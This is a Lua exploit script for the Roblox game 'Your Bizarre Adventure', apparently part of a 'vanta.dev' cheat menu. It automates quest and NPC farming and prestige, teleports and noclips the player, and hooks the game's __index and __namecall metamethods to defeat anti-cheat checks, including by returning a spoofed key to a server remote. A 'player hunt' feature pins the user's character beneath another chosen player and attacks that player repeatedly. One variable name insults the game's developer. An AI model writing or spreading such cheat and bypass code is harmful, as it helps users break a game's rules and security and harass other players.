                getgenv().QuestMethod = "Without Stand"
                
                getgenv().SelectedQuest = "Officer Sam [Lvl. 1+]"
                notify("YBA Script", "Auto-selected Level 1 quest: Officer Sam")
                
                local startTime = tick()
                local maxWait = 300
                
                while getgenv().QuestFarmEnabled and playerLevel <= 2 and tick() - startTime < maxWait do
                    playerLevel = GetPlayerLevel()
                    
                    if playerLevel >= 3 then
                        notify("YBA Script", "Leveled up to " .. playerLevel .. "! Now getting stand...")
                        break
                    end
                    
                    if getgenv().CompletedQuest then
                        local questNPC = workspace:FindFirstChild("Dialogues") and workspace.Dialogues:FindFirstChild("Officer Sam [Lvl. 1+]")
                        if questNPC then
                            pcall(function() GetQuest(questNPC) end)
                            getgenv().CompletedQuest = false
                        end
                    else
                        local living = workspace:FindFirstChild("Living")
                        if living then
                            for _, v in pairs(living:GetChildren()) do
                                if not getgenv().QuestFarmEnabled then break end
                                if v.Name == "Thug" and v:FindFirstChild("HumanoidRootPart") and v:FindFirstChild("Health") and v.Health.Value > 0 then
                                    pcall(function() KillEnemy(v) end)
                                    task.wait(math.max(0.05, getgenv().QuestDelay))
                                    
                                    playerLevel = GetPlayerLevel()
                                    if playerLevel >= 3 then break end
                                end
                            end
                        end
                    end
                    
                    task.wait(0.1)
                end
                
                if playerLevel >= 3 then
                    notify("YBA Script", "Collecting arrows and rokakaka for stand...")
                    local success = CollectRokaArrow()
                    if success then
                        notify("YBA Script", "Stand obtained! Switching to WITH STAND mode...")
                        local character = GetCharacter()
                        local humanoid = character and character:FindFirstChildWhichIsA("Humanoid")
                        if humanoid then
                            humanoid.Health = 0
                        end
                        GetPlayer().CharacterAdded:Wait()
                        task.wait(2)
                    else
                        notify("YBA Script", "Failed to get stand, will retry...")
                    end
                end
                
                getgenv().QuestMethod = originalMethod
                notify("YBA Script", "Now farming WITH STAND enabled!")
            end
            
            local function GetPlayerLevel()
    local hasStand = HasStand()
    
    if getgenv().QuestMethod ~= "With Stand" then return true end
    if playerLevel < 3 then return true end
    
    if not hasStand then
        notify("YBA Script", "Level " .. playerLevel .. " requires stand! Obtaining one...")
        local success = CollectRokaArrow()
        if success then
            local character = GetCharacter()
            local humanoid = character and character:FindFirstChildWhichIsA("Humanoid")
            if humanoid then
                humanoid.Health = 0
            end
            GetPlayer().CharacterAdded:Wait()
            task.wait(2)
            notify("YBA Script", "Stand obtained! Resuming quest farming...")
            return true
        else
            notify("YBA Script", "Failed to obtain stand!")
            return false
        end
    end
    return true
end
            
            local function GetPlayerLevel()
                local player = GetPlayer()
                if player and player:FindFirstChild("PlayerStats") and player.PlayerStats:FindFirstChild("Level") then
                    return player.PlayerStats.Level.Value
                end
                return 0
            end
            
            local function GetQuestLevelRequirement(questName)
                if not questName then return 0 end
                local levelReq = tonumber(questName:match("(%d+)"))
                return levelReq or 0
            end
            
            local function GetBestAvailableQuest()
                local playerLevel = GetPlayerLevel()
                local bestQuest = nil
                local highestReq = -1
                
                for _, questName in pairs(ParsedQuests) do
                    if questName ~= "No quests available" then
                        local levelReq = GetQuestLevelRequirement(questName)
                        if levelReq and levelReq <= playerLevel and levelReq > highestReq then
                            highestReq = levelReq
                            bestQuest = questName
                        end
                    end
                end
                return bestQuest
            end
            
            local function UpdateQuestDropdown(newQuest)
                pcall(function()
                    for _, element in pairs(QuestFarmSection:GetChildren() or {}) do
                        if element.Flag == "SelectedQuest" or element.Title == "Select Quest" then
                            if element.Set then
                                element:Set(newQuest)
                            elseif element.Update then
                                element:Update({Value = newQuest})
                            end
                            break
                        end
                    end
                end)
            end
            
            local currentQuest = getgenv().SelectedQuest
            local playerLevel = GetPlayerLevel()
            local questLevel = GetQuestLevelRequirement(currentQuest)
            
            if questLevel > playerLevel then
                local bestQuest = GetBestAvailableQuest()
                if bestQuest then
                    getgenv().SelectedQuest = bestQuest
                    UpdateQuestDropdown(bestQuest)
                else
                    notify("YBA Script", "WARNING: No quests available for level " .. playerLevel)
                end
            end

            local questCompletedConn
            if GetPlayer().PlayerGui and GetPlayer().PlayerGui:FindFirstChild("HUD") then
                local hud = GetPlayer().PlayerGui.HUD
                questCompletedConn = hud.ChildAdded:Connect(function(Child)
                    if Child and Child.Name == "QuestCompleted" then
                        getgenv().CompletedQuest = true
                        pcall(function() questStatus:Update({ Title = "Status: Quest Completed!" }) end)
                        notify("YBA Script", "Quest completed! Getting next one...")
                    end
                end)
            end

            task.spawn(function()
                while getgenv().QuestFarmEnabled do
                    local autoSwitchOnLevelUp = false
                    
                    if autoSwitchOnLevelUp then
                        local playerLevel = GetPlayerLevel()
                        local currentQuest = getgenv().SelectedQuest
                        local targetQuestLevel = GetQuestLevelRequirement(currentQuest)
                        local bestQuest = GetBestAvailableQuest()
                        
                        if bestQuest and bestQuest ~= currentQuest then
                            local bestQuestLevel = GetQuestLevelRequirement(bestQuest)
                            if bestQuestLevel > targetQuestLevel and bestQuestLevel > selectedQuestLevel then
                                getgenv().SelectedQuest = bestQuest
                                UpdateQuestDropdown(bestQuest)
                                getgenv().CompletedQuest = true
                                notify("YBA Script", "Leveled up! Switching to: " .. bestQuest)
                                task.wait(0.5)
                            end
                        end
                    end
                    local playerLevel = GetPlayerLevel()
                    local selectedQuest = getgenv().SelectedQuest
                    
                    if selectedQuest and selectedQuest ~= "" and selectedQuest ~= "No quests available" then
                        local selectedLevel = GetQuestLevelRequirement(selectedQuest)
                        
                        if selectedLevel > playerLevel then
                            local bestQuest = GetBestAvailableQuest()
                            if bestQuest and bestQuest ~= selectedQuest then
                                notify("YBA Script", "Level " .. playerLevel .. " is not enough for " .. selectedQuest .. " (Req: " .. selectedLevel .. "). Switching to: " .. bestQuest)
                                getgenv().SelectedQuest = bestQuest
                                pcall(function()
                                    local dropdown = QuestFarmSection:FindFirstChild("SelectedQuest")
                                    if dropdown and dropdown.Set then
                                        dropdown:Set(bestQuest)
                                    end
                                end)
                            elseif not bestQuest then
                                notify("YBA Script", "Level " .. playerLevel .. " is not enough for " .. selectedQuest .. ". No available quests found!")
                                task.wait(3)
                                continue
                            end
                        end
                    end
                    
                    local questName = getgenv().SelectedQuest
                    
                    if getgenv().QuestMethod == "With Stand" then
                        if playerLevel < 3 then
                            if HasStand() then
                                notify("YBA Script", "Level " .. playerLevel .. ": Removing stand to farm faster...")
                                local roka = GetPlayer().Backpack:FindFirstChild("Rokakaka") or GetCharacter():FindFirstChild("Rokakaka")
                                if roka then
                                    local humanoid = GetCharacter():FindFirstChildWhichIsA("Humanoid")
                                    if humanoid then
                                        humanoid:EquipTool(roka)
                                        task.wait(0.5)
                                        local remote = GetCharacter():FindFirstChild("RemoteEvent")
                                        if remote then
                                            remote:FireServer("UseItem", roka)
                                        end
                                        for i = 1, 10 do
                                            game:GetService("VirtualInputManager"):SendMouseButtonEvent(0, 8, 0, true, nil, 1)
                                            task.wait(0.1)
                                        end
                                    end
                                end
                                GetPlayer().CharacterAdded:Wait()
                                task.wait(1)
                            end
                            EquipStand()
                            
                        elseif playerLevel >= 3 and not HasStand() then
                            local success = CollectRokaArrow()
                            if not success then
                                task.wait(getgenv().QuestDelay)
                                continue
                            else
                                task.wait(1)
                                local character = GetCharacter()
                                local humanoid = character and character:FindFirstChildWhichIsA("Humanoid")
                                if humanoid then
                                    humanoid.Health = 0
                                end
                                local player = GetPlayer()
                                player.CharacterAdded:Wait()
                                task.wait(2)
                                local newStand = player.PlayerStats.Stand.Value
                                EquipStand()
                                task.wait(1)
                            end
                        elseif playerLevel >= 3 and HasStand() then
                            EquipStand()
                        end
                    else
                        EquipStand()
                    end
                    
                                        UpdateQuestStatus()

                    if not questName or questName == "" or questName == "No quests available" then
                        task.wait(getgenv().QuestDelay)
                        continue
                    end

                    local questData = QuestInfo[questName]
                    if not questData then
                        pcall(function() questStatus:Update({ Title = "Status: Quest data not found" }) end)
                        notify("YBA Script", "Quest data not found: " .. questName)
                        task.wait(getgenv().QuestDelay)
                        continue
                    end

                    if getgenv().QuestMethod == "With Stand" and playerLevel >= 3 and not HasStand() then
                        if not EnsureStandForQuesting() then
                            task.wait(2)
                            continue
                        end
                    end

                    if getgenv().CompletedQuest then
                        pcall(function() questStatus:Update({ Title = "Status: Taking quest..." }) end)
                        local questNPC = workspace:FindFirstChild("Dialogues") and workspace.Dialogues:FindFirstChild(questName)
                        if questNPC then
                            pcall(disableNoclip)
                            local hrp = GetHRP()
                            local npcCf = GetModelCFrame(questNPC)
                            if hrp and npcCf then
                                hrp.CFrame = npcCf + Vector3.new(0, 3, 0)
                                hrp.AssemblyLinearVelocity = Vector3.new(0, 0, 0)
                                hrp.Velocity = Vector3.new(0, 0, 0)
                                local oldAnchored = hrp.Anchored
                                hrp.Anchored = true
                                task.delay(0.25, function()
                                    if hrp then
                                        hrp.Anchored = oldAnchored
                                    end
                                end)
                                task.wait(0.3)
                            end
                            local ok = false
                            pcall(function() ok = GetQuest(questNPC) end)
                            if ok then
                                getgenv().CompletedQuest = false
                                pcall(UpdateQuestStatus)
                                task.wait(getgenv().QuestDelay)
                            else
                                pcall(function() questStatus:Update({ Title = "Status: Failed to take quest, waiting..." }) end)
                                task.wait(getgenv().QuestDelay)
                            end
                        else
                            pcall(function() questStatus:Update({ Title = "Status: Quest NPC not found" }) end)
                            task.wait(getgenv().QuestDelay)
                        end
                    else
                        if questData.Enemy then
                            pcall(function() questStatus:Update({ Title = "Status: Farming " .. questData.Enemy .. " (Lvl " .. playerLevel .. ")" }) end)
                            local enemyName = questData.Enemy
                            local living = workspace:FindFirstChild("Living")
                            if living then
                                local doneThisCycle = false
                                for _, v in pairs(living:GetChildren()) do
                                    if not getgenv().QuestFarmEnabled then break end
                                    if v.Name == enemyName and v:FindFirstChild("HumanoidRootPart") and v:FindFirstChild("Health") and v.Health.Value > 0 then
                                        local currentLvl = GetPlayerLevel()
                                        if currentLvl >= 3 and not HasStand() and getgenv().QuestMethod == "With Stand" then
                                            notify("YBA Script", "Level 3 reached! Breaking to get stand...")
                                            break
                                        end
                                        
                                        local success, err = pcall(function() KillEnemy(v) end)
                                        if not success then warn("Quest Farm Error:", err) end
                                        doneThisCycle = true
                                        task.wait(math.max(0.05, getgenv().QuestDelay))
                                    end
                                end
                                if not doneThisCycle then
                                    task.wait(getgenv().QuestDelay)
                                end
                            else
                                task.wait(getgenv().QuestDelay)
                            end
                        elseif questData.Item then
                            pcall(function() questStatus:Update({ Title = "Status: Collecting " .. questData.Item }) end)
                            local itemName = questData.Item
                            local requiredAmount = questData.Amount or 1
                            local function CountItems()
                                local current = 0
                                local ply = GetPlayer()
                                if ply then
                                    if ply:FindFirstChild("Backpack") then
                                        for _, it in pairs(ply.Backpack:GetChildren()) do
                                            if it.Name == itemName then current = current + 1 end
                                        end
                                    end
                                    if ply.Character then
                                        for _, it in pairs(ply.Character:GetChildren()) do
                                            if it.Name == itemName then current = current + 1 end
                                        end
                                    end
                                end
                                return current
                            end

                            if CountItems() >= requiredAmount then
                                getgenv().CompletedQuest = true
                                pcall(function() questStatus:Update({ Title = "Status: Item requirement met" }) end)
                            else
                                local spawns = workspace:FindFirstChild("Item_Spawns") and workspace.Item_Spawns:FindFirstChild("Items")
                                if spawns then
                                    for _, v in pairs(spawns:GetChildren()) do
                                        if not getgenv().QuestFarmEnabled then break end
                                        local prox = v:FindFirstChild("ProximityPrompt")
                                        if prox and prox.ObjectText == itemName and v:FindFirstChild("PrimaryPart") then
                                            local success, err = pcall(function()
                                                local Character = GetCharacter()
                                                local HRP = GetHRP()
                                                if HRP and v.PrimaryPart then
                                                    local OldCF = HRP.CFrame
                                                    HRP.CFrame = v.PrimaryPart.CFrame + Vector3.new(0, 3, 0)
                                                    task.wait(math.max(0.05, getgenv().QuestDelay))
                                                    fireproximityprompt(prox, 0, true)
                                                    task.wait(math.max(0.05, getgenv().QuestDelay))
                                                    HRP.CFrame = OldCF
                                                end
                                            end)
                                            if not success then warn("Item collect error:", err) end
                                            task.wait(math.max(0.05, getgenv().QuestDelay))
                                        end
                                    end
                                end
                            end
                        end
                    end

                        task.wait(getgenv().QuestDelay)
                    end

                    pcall(function()
                        if questCompletedConn and type(questCompletedConn.Disconnect) == "function" then
                            questCompletedConn:Disconnect()
                        end
                    end)
                    disableNoclip()
                    if questFarmCharConn then
                        pcall(function() questFarmCharConn:Disconnect() end)
                        questFarmCharConn = nil
                    end
                    pcall(UpdateQuestStatus)
                end)
            else
                pcall(function() questStatus:Update({ Title = "Status: Idle" }) end)
                notify("YBA Script", "Quest Farm stopped!")
                disableNoclip()
                if questFarmCharConn then
                    pcall(function() questFarmCharConn:Disconnect() end)
                    questFarmCharConn = nil
                end
            end
        end
    })

    QuestFarmSection:Space()
local autoPresOnMax = false
QuestFarmSection:Toggle({
    Flag = "AutoPresOnMax",
    Title = "Auto Pres on Max",
    Locked = false,
    Default = false,
    Callback = function(value)
        autoPresOnMax = value
        if value then
            notify("YBA Script", "Auto Prestige enabled! Will prestige at max level (35/40/45)")
            spawn(function()
                while autoPresOnMax do
                    wait(2)
                    pcall(function()
                        local ps = player:FindFirstChild("PlayerStats")
                        if ps then
                            local level = ps:FindFirstChild("Level")
                            local prestige = ps:FindFirstChild("Prestige")
                            if level and prestige then
                                local canPres = false
                                if prestige.Value == 0 and level.Value >= 35 then canPres = true
                                elseif prestige.Value == 1 and level.Value >= 40 then canPres = true
                                elseif prestige.Value == 2 and level.Value >= 45 then canPres = true
                                end
                                
                                if canPres then
                                    local char = player.Character
                                    if char and char:FindFirstChild("RemoteEvent") then
                                        char.RemoteEvent:FireServer("EndDialogue", {
                                            NPC = "Prestige",
                                            Dialogue = "Dialogue2",
                                            Option = "Option1"
                                        })
                                        notify("YBA Script", "Auto Prestiged! Now Prestige " .. (prestige.Value + 1))
                                        wait(10)
                                    end
                                end
                            end
                        end
                    end)
                end
            end)
        else
            notify("YBA Script", "Auto Prestige disabled.")
        end
    end
})

    local NpcFarmSection = QuestTab:Section({ Title = "NPC Farm" })

    getgenv().TargetNPC = ""
    getgenv().NPCFarmEnabled = false

    local npcDropdown = NpcFarmSection:Dropdown({
        Flag = "SelectedNPC",
        Title = "Select NPC",
        SearchBarEnabled = true,
        Values = {},        
        Value = "",         
        Callback = function(selected)
            if selected and selected ~= "" and selected ~= "No spawnable NPCs found" then
                getgenv().TargetNPC = selected
                notify("YBA Script", "Target NPC set to: " .. selected)
            else
                getgenv().TargetNPC = ""
            end
        end
    })

    NpcFarmSection:Toggle({
        Flag = "NPCFarmEnabled",
        Title = "Enable NPC Farm",
        Default = false,
        Callback = function(value)
            getgenv().NPCFarmEnabled = value
            if value then
                notify("YBA Script", "NPC Farm started!")
                task.spawn(function()
                    while getgenv().NPCFarmEnabled do
                        local target = getgenv().TargetNPC
                        if target and target ~= "" and target ~= "No spawnable NPCs found" then
                            local livingFolder = workspace:FindFirstChild("Living")
                            if livingFolder then
                                local anyFound = false
                                for _, v in pairs(livingFolder:GetChildren()) do
                                    if not getgenv().NPCFarmEnabled then break end
                                    if v.Name == target and v:FindFirstChild("HumanoidRootPart") and v:FindFirstChildWhichIsA("Humanoid") and v:FindFirstChild("Health") and v.Health.Value > 0 then
                                        anyFound = true
                                        local success, err = pcall(function() KillEnemy(v) end)
                                        if not success then warn("NPC Farm Error:", err) end
                                        task.wait(math.max(0.05, getgenv().QuestDelay))
                                    end
                                end
                                if not anyFound then
                                    task.wait(getgenv().QuestDelay)
                                end
                            else
                                task.wait(getgenv().QuestDelay)
                            end
                        else
                            local livingFolder = workspace:FindFirstChild("Living")
                            if livingFolder then
                                local didAny = false
                                for _, v in pairs(livingFolder:GetChildren()) do
                                    if not getgenv().NPCFarmEnabled then break end
                                    if v:FindFirstChild("Spawn") and v:FindFirstChild("HumanoidRootPart") and v:FindFirstChild("Health") and v.Health.Value > 0 then
                                        didAny = true
                                        local success, err = pcall(function() KillEnemy(v) end)
                                        if not success then warn("NPC Farm Error:", err) end
                                        task.wait(math.max(0.05, getgenv().QuestDelay))
                                    end
                                end
                                if not didAny then
                                    task.wait(getgenv().QuestDelay)
                                end
                            else
                                task.wait(getgenv().QuestDelay)
                            end
                        end
                        task.wait(math.max(0.05, getgenv().QuestDelay))
                    end
                end)
            else
                notify("YBA Script", "NPC Farm stopped!")
            end
        end
    })

    task.spawn(function()
        task.wait(0.5)
        UpdateNPCList(npcDropdown)
    end)

    getgenv().CompletedQuest = true
    getgenv().QuestFarmEnabled = false

    notify("vanta.dev", "Quest & NPC Farm features loaded!")
end


LoadQuestFeatures()
local bypassSuccess, bypassError = pcall(function()
    local oldMagnitude = hookmetamethod(Vector3.new(), "__index", newcclosure(function(self, index)
        local CallingScript = tostring(getcallingscript())
        if not checkcaller() and index == "magnitude" and CallingScript == "ItemSpawn" then
            return 0
        end
        return oldMagnitude(self, index)
    end))
    
    local UzuKeeIsRetardedAndDoesntKnowHowToMakeAnAntiCheatOnTheServerSideAlsoVexStfuIKnowTheCodeIsBadYouDontNeedToTellMe = "  ___XP DE KEY"
    local oldNc = hookmetamethod(game, "__namecall", newcclosure(function(self, ...)
        local Method = getnamecallmethod()
        local Args = {...}
        if not checkcaller() and rawequal(self.Name, "Returner") and rawequal(Args[1], "idklolbrah2de") then
            return UzuKeeIsRetardedAndDoesntKnowHowToMakeAnAntiCheatOnTheServerSideAlsoVexStfuIKnowTheCodeIsBadYouDontNeedToTellMe
        end
        return oldNc(self, ...)
    end))
    
    getgenv().oldMagnitude = oldMagnitude
    getgenv().oldNc = oldNc
    
    wait(0.1)
end)
local DeveloperTestTab
WindUI:Notify({
    Title = "vanta.dev",
    Content = "Developer Test tab loaded. Tab is for testing features and may be unstable. Please do not use w/o experience or explicit permission. If you get banned, you are responsible for your own actions. The rest of the script, vanta team takes full accountability.",
    Duration = 10,
    Icon = "eye"
})
local DeveloperTestTab = 
Window:Tab({ Title = "Developer Test", Icon = "eye" })

local DevSection = DeveloperTestTab:Section({ Title = "Test Features" })

DevSection:Button({
    Title = "Test Button",
    Callback = function()
        WindUI:Notify({
            Title = "Test",
            Content = "Working!",
            Icon = "check"
        })
    end
})
DevSection:Toggle({
    Title = "Test Toggle",
    Default = false,
    Callback = function(value)
        if value then
            WindUI:Notify({
                Title = "Test Toggle",
                Content = "Enabled!",
                Icon = "check"
            })
        else
            WindUI:Notify({
                Title = "Test Toggle",
                Content = "Disabled!",
                Icon = "x"
            })
        end
    end
})
DevSection:Slider({
    Title = "Test Slider",
    Step = 1,
    Value = {
        Min = 0,
        Max = 100,
        Default = 50
    },
    Callback = function(value)
        WindUI:Notify({
            Title = "Test Slider",
            Content = "Value: " .. value,
            Icon = "check"
        })
    end
})
DevSection:Dropdown({
    Title = "Test Dropdown",
    Values = { "Option 1", "Option 2", "Option 3" },
    Value = "Option 1",
    Callback = function(value)
        WindUI:Notify({
            Title = "Test Dropdown",
            Content = "Selected: " .. value,
            Icon = "check"
        })
    end
})
DevSection:Button({
    Title = "Coordinate Tracker",
    Callback = function()
        local player = game.Players.LocalPlayer
        local character = player.Character
        
        if not character or not character:FindFirstChild("HumanoidRootPart") then
            WindUI:Popup({
                Title = "Error",
                Icon = "x",
                Content = "Character not found!",
                Buttons = {
                    {
                        Title = "Ok",
                        Icon = "x",
                    }
                }
            })
            return
        end
        
        local hrp = character.HumanoidRootPart
        local position = hrp.Position
        local coordinates = string.format("X: %.2f, Y: %.2f, Z: %.2f", position.X, position.Y, position.Z)
        
        setclipboard(coordinates)
        
        WindUI:Popup({
            Title = "Coordinates Copied",
            Icon = "check-circle",
            Content = coordinates,
            Buttons = {
                {
                    Title = "Ok",
                    Icon = "check-circle",
                }
            }
        })
    end
})
DevSection:Button({
    Title = "Ping Test",
    Callback = function()
        local stats = game:GetService("Stats")
        local pingValue = 0
        
        if stats:FindFirstChild("Network") then
            local network = stats.Network
            if network:FindFirstChild("ServerReplicator") then
                local replicator = network.ServerReplicator
                if replicator:FindFirstChild("DataPingServer") then
                    pingValue = math.round(replicator.DataPingServer.Value * 1000)
                elseif replicator:FindFirstChild("DataPing") then
                    pingValue = math.round(replicator.DataPing.Value * 1000)
                end
            end
        end
        
        if pingValue > 0 then
            WindUI:Notify({
                Title = "Ping",
                Content = "Your ping: " .. pingValue .. "ms",
                Icon = "wifi"
            })
        else
            WindUI:Notify({
                Title = "Ping",
                Content = "FEATURE BUGGED: Could not retrieve ping value.",
                Icon = "wifi"
            })
        end
    end
})
MiscTab:Space()

MiscTab:Section({
    Title = "Coming Soon",
})

getgenv().TWOHFarmEnabled = false
getgenv().TWOHFarmConnection = nil
getgenv().TWOHCleanupFunctions = {}

MiscTab:Section({
    Title = "Assisted TWOH Farm",
})

getgenv().SelectedHuntTarget = ""
getgenv().GetPlayerList = function()
    local playerNames = {}
    for _, p in pairs(game:GetService("Players"):GetPlayers()) do
        if p ~= game.Players.LocalPlayer then
            table.insert(playerNames, p.Name)
        end
    end
    return playerNames
end

MiscTab:Dropdown({
    Flag = "TWOHPlayerSelect",
    Title = "Select Player to Hunt",
    SearchBarEnabled = true,
    Values = GetPlayerList(),
    Callback = function(selected)
        if not selected or selected == "" then
            getgenv().TWOHFarmEnabled = false
            return
        end
        
        getgenv().SelectedHuntTarget = selected
        
        local targetPlayer = game:GetService("Players"):FindFirstChild(selected)
        if targetPlayer and targetPlayer.Character then
            notify("YBA Script", "Target set to: " .. selected)
            
            -- Clear previous cleanup functions
            for _, cleanupFunc in pairs(getgenv().TWOHCleanupFunctions) do
                pcall(cleanupFunc)
            end
            getgenv().TWOHCleanupFunctions = {}
            
            -- Auto start TWOH farm
            getgenv().TWOHFarmEnabled = true
            
            local noclipEnabled = false
            local noclipConn = nil
            local bp = nil
            local bg = nil
            local standBp = nil
            local standBg = nil
            local RunService = game:GetService("RunService")
            local originalPos = nil
            
            local function enableNoclip()
                if noclipEnabled then return end
                local char = game.Players.LocalPlayer.Character
                if not char then return end
                
                noclipConn = RunService.Stepped:Connect(function()
                    for _, part in pairs(char:GetDescendants()) do
                        if part:IsA("BasePart") then
                            part.CanCollide = false
                        end
                    end
                end)
                noclipEnabled = true
            end
            
            local function disableNoclip()
                if noclipConn then
                    noclipConn:Disconnect()
                    noclipConn = nil
                end
                noclipEnabled = false
            end
            
            local function teleportAboveGround()
                local myChar = game.Players.LocalPlayer.Character
                if myChar and myChar:FindFirstChild("HumanoidRootPart") then
                    local hrp = myChar.HumanoidRootPart
                    local targetLoc = originalPos or hrp.CFrame
                    hrp.CFrame = targetLoc + Vector3.new(0, 10, 0)
                    task.wait(0.1)
                    hrp.AssemblyLinearVelocity = Vector3.new(0, 0, 0)
                    hrp.Velocity = Vector3.new(0, 0, 0)
                end
            end
            
            local function cleanup()
                disableNoclip()
                pcall(function()
                    if bp then bp:Destroy() bp = nil end
                    if bg then bg:Destroy() bg = nil end
                    if standBp then standBp:Destroy() standBp = nil end
                    if standBg then standBg:Destroy() standBg = nil end
                end)
                task.wait(0.2)
                teleportAboveGround()
                task.wait(0.2)
            end
            
            table.insert(getgenv().TWOHCleanupFunctions, cleanup)
            
            task.spawn(function()
                while getgenv().TWOHFarmEnabled do
                    task.wait()
                    
                    local targetPlayer = game:GetService("Players"):FindFirstChild(selected)
                    if not targetPlayer or not targetPlayer.Character then
                        notify("YBA Script", "Target player not found!")
                        getgenv().TWOHFarmEnabled = false
                        cleanup()
                        break
                    end
                    
                    local myChar = game.Players.LocalPlayer.Character
                    if not myChar or not myChar:FindFirstChild("HumanoidRootPart") then
                        game.Players.LocalPlayer.CharacterAdded:Wait()
                        task.wait(0.5)
                        originalPos = nil
                        continue
                    end
                    
                    if not originalPos then
                        originalPos = myChar.HumanoidRootPart.CFrame
                    end
                    
                    local targetChar = targetPlayer.Character
                    local targetHRP = targetChar:FindFirstChild("HumanoidRootPart")
                    local targetHum = targetChar:FindFirstChildWhichIsA("Humanoid")
                    local myHRP = myChar:FindFirstChild("HumanoidRootPart")
                    local myRemote = myChar:FindFirstChild("RemoteEvent")
                    local myStandMorph = myChar:FindFirstChild("StandMorph")
                    
                    if not targetHRP or not targetHum or targetHum.Health <= 0 then
                        notify("YBA Script", "Target is dead or invalid!")
                        getgenv().TWOHFarmEnabled = false
                        cleanup()
                        break
                    end
                    
                    enableNoclip()
                    
                    local undergroundOffset = -25
                    local targetCFrame = targetHRP.CFrame + Vector3.new(0, undergroundOffset, 0)
                    
                    if myChar.PrimaryPart then
                        if not bp or bp.Parent ~= myChar.PrimaryPart then
                            bp = Instance.new("BodyPosition")
                            bp.Position = targetCFrame.Position
                            bp.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
                            bp.P = 10000
                            bp.D = 100
                            bp.Parent = myChar.PrimaryPart
                        else
                            bp.Position = targetCFrame.Position
                        end
                        
                        if not bg or bg.Parent ~= myChar.PrimaryPart then
                            bg = Instance.new("BodyGyro")
                            bg.CFrame = targetCFrame
                            bg.MaxTorque = Vector3.new(math.huge, math.huge, math.huge)
                            bg.P = 10000
                            bg.D = 100
                            bg.Parent = myChar.PrimaryPart
                        else
                            bg.CFrame = targetCFrame
                        end
                        
                        myChar.PrimaryPart.CFrame = targetCFrame
                        myChar.PrimaryPart.AssemblyLinearVelocity = Vector3.new(0, 0, 0)
                        myChar.PrimaryPart.Velocity = Vector3.new(0, 0, 0)
                    end
                    
                    if myStandMorph and myStandMorph.PrimaryPart then
                        local standRoot = myStandMorph.PrimaryPart
                        local standTargetCFrame = targetHRP.CFrame - targetHRP.CFrame.LookVector * 1.1
                        
                        if not standBp or standBp.Parent ~= standRoot then
                            standBp = Instance.new("BodyPosition")
                            standBp.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
                            standBp.P = 10000
                            standBp.D = 100
                            standBp.Parent = standRoot
                        end
                        standBp.Position = standTargetCFrame.Position
                        
                        if not standBg or standBg.Parent ~= standRoot then
                            standBg = Instance.new("BodyGyro")
                            standBg.MaxTorque = Vector3.new(math.huge, math.huge, math.huge)
                            standBg.P = 10000
                            standBg.D = 100
                            standBg.Parent = standRoot
                        end
                        standBg.CFrame = standTargetCFrame
                        
                        standRoot.CFrame = standTargetCFrame
                        standRoot.AssemblyLinearVelocity = Vector3.new(0, 0, 0)
                    end
                    
                    if myRemote then
                        pcall(function()
                            myRemote:FireServer("HoldAttack", {Bool = true, Type = "m1"})
                            myRemote:FireServer("HoldAttack", {Bool = false, Type = "m1"})
                        end)
                    end
                    
                    task.wait(0.1)
                end
            end)
        end
    end
})

MiscTab:Space()

MiscTab:Button({
    Title = "Stop Player Farming",
    Callback = function()
        getgenv().TWOHFarmEnabled = false
        notify("YBA Script", "Player farming stopped!")
        for _, cleanupFunc in pairs(getgenv().TWOHCleanupFunctions) do
            task.spawn(cleanupFunc)
        end
        getgenv().TWOHCleanupFunctions = {}
        task.wait(0.5)
    end
})

do
    local VirtualInputManager = game:GetService("VirtualInputManager")

    getgenv().AutoPressKey = getgenv().AutoPressKey or nil
    getgenv().AutoPressSpamDelay = getgenv().AutoPressSpamDelay or 0.03
    getgenv().AutoPressLoopToken = (getgenv().AutoPressLoopToken or 0) + 1

    local function tapSelectedKey()
        local keyName = getgenv().AutoPressKey
        if not keyName then return end

        local keyCode = Enum.KeyCode[keyName]
        if not keyCode then return end

        VirtualInputManager:SendKeyEvent(true, keyCode, false, game)
        task.wait(0.01)
        VirtualInputManager:SendKeyEvent(false, keyCode, false, game)
    end

    getgenv().startAutoPressLoop = function()
        getgenv().AutoPressLoopToken = getgenv().AutoPressLoopToken + 1
        local myToken = getgenv().AutoPressLoopToken

        task.spawn(function()
            while myToken == getgenv().AutoPressLoopToken do
                if getgenv().TWOHFarmEnabled and getgenv().AutoPressKey then
                    pcall(tapSelectedKey)
                    task.wait(getgenv().AutoPressSpamDelay) -- spam speed
                else
                    task.wait(0.1)
                end
            end
        end)
    end

    startAutoPressLoop()

    MiscTab:Dropdown({
        Flag = "AutoPressKeys",
        Title = "Auto Press Keys for Block Breaker",
        Values = { "None", "E", "Q", "R", "F", "G", "H", "T", "Y", "U", "I", "O", "P", "Z", "X", "C", "V", "B", "N", "M" },
        Value = "None",
        Callback = function(selected)
            if selected == "None" then
                getgenv().AutoPressKey = nil
                notify("YBA Script", "Auto key spam disabled.")
            else
                getgenv().AutoPressKey = selected
                notify("YBA Script", "Auto key spam set to: " .. selected)
            end
        end
    })

    MiscTab:Slider({
        Flag = "AutoPressSpamDelay",
        Title = "Key Spam Delay (sec)",
        Step = 0.01,
        Value = {
            Min = 0.01,
            Max = 0.5,
            Default = 0.03
        },
        Callback = function(v)
            getgenv().AutoPressSpamDelay = v
        end
    })
end
MiscTab:Space()
MiscTab:Section({
    Title = "Hamon",
})
do
    getgenv().VIM = game:GetService("VirtualInputManager")
    getgenv().UIS = game:GetService("UserInputService")

    getgenv().AutoHamonCharge = getgenv().AutoHamonCharge or false
    getgenv().AutoHamonChargeToken = getgenv().AutoHamonChargeToken or 0
    getgenv().holdingL = getgenv().holdingL or false
    getgenv().HamonRebindTick = getgenv().HamonRebindTick or 0
    getgenv().HamonChargeInterval = getgenv().HamonChargeInterval or 7.5
    getgenv().HamonHoldDuration = getgenv().HamonHoldDuration or 2.25
    getgenv().HamonLastBind = getgenv().HamonLastBind or 0

    getgenv().forceHamonBindL = function()
        getgenv()._char = game.Players.LocalPlayer.Character
        getgenv()._rf = getgenv()._char and getgenv()._char:FindFirstChild("RemoteFunction")
        if not getgenv()._rf then return end

        pcall(function()
            getgenv()._rf:InvokeServer("AssignSkillKey", {
                Type = "Character",
                Key = "Enum.KeyCode.L",
                Skill = "Hamon Breathing"
            })
        end)

        pcall(function()
            getgenv()._rf:InvokeServer("AssignSkillKey", {
                Type = "Stand",
                Key = "Enum.KeyCode.L",
                Skill = "Hamon Breathing"
            })
        end)
    end

    getgenv().holdL = function()
        if getgenv().holdingL or getgenv().UIS:GetFocusedTextBox() then return end
